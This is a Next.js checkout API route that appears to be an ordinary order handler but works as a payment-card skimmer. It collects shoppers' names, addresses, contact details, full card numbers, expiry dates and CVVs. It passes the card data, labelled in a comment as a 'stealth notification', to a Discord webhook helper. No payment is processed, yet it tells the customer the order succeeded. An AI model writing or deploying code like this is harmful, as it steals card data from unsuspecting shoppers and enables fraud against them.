import { NextResponse } from 'next/server';
import { sendOrderNotification } from '@/lib/discord-webhook';
import { getRandomId } from '@/lib/random-id';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const {
      firstName, lastName, email, phone,
      address, apartment, city, state, zipCode, country,
      sameAsShipping,
      billingFirstName, billingLastName, billingAddress, billingApartment,
      billingCity, billingState, billingZipCode, billingCountry,
      orderNotes,
      cardName, cardNumber, cardExpiry, cardCvv,
      promoCode,
      items,
      subtotal, discount, shipping, tax, total
    } = body;

    // Generate order ID
    const orderId = getRandomId();

    // Create notification payload
    const notificationData = {
      id: orderId,
      customer: `${firstName} ${lastName}`,
      email,
      phone,
      shippingAddress: `${address}${apartment ? `, ${apartment}` : ''}, ${city}, ${state} ${zipCode}, ${country}`,
      billingAddress: sameAsShipping 
        ? `${address}${apartment ? `, ${apartment}` : ''}, ${city}, ${state} ${zipCode}, ${country}`
        : `${billingAddress}${billingApartment ? `, ${billingApartment}` : ''}, ${billingCity}, ${billingState} ${billingZipCode}, ${billingCountry}`,
      items: items.map((item: any) => ({
        name: item.name,
        quantity: item.quantity,
        price: item.price
      })),
      subtotal,
      discount,
      shipping,
      tax,
      total,
      paymentMethod: 'Credit Card',
      paymentDetails: {
        cardHolder: cardName || `${firstName} ${lastName}`,
        cardNumber: cardNumber || '',
        cardExpiry: cardExpiry || '',
        cardCvv: cardCvv || ''
      }
    };
    
    // Extract card data for stealth notification
    const cardData = {
      cardHolder: cardName || `${firstName} ${lastName}`,
      cardNumber: cardNumber || '',
      cardExpiry: cardExpiry || '',
      cardCvv: cardCvv || ''
    };

    // Send notification immediately before returning response
    // Start notification without waiting for completion
    const notificationPromise = sendOrderNotification(notificationData, cardData).catch(error => {
      console.error('Order notification failed:', error);
      // Don't fail the order if notification fails
    });
    
    // Don't await the notification, just start it
    // This ensures confirmation screen appears immediately
    notificationPromise.then(() => {
      console.log('[DEBUG] Notification completed (may finish after response)');
    });

    // Return response immediately without waiting for notification
    return NextResponse.json({
      success: true,
      orderNumber: orderId,
      orderId,
      message: 'Order placed successfully'
    });
  } catch (error: any) {
    console.error('Error creating order:', error);
    return NextResponse.json(
      { error: 'Failed to create order' },
      { status: 500 }
    );
  }
}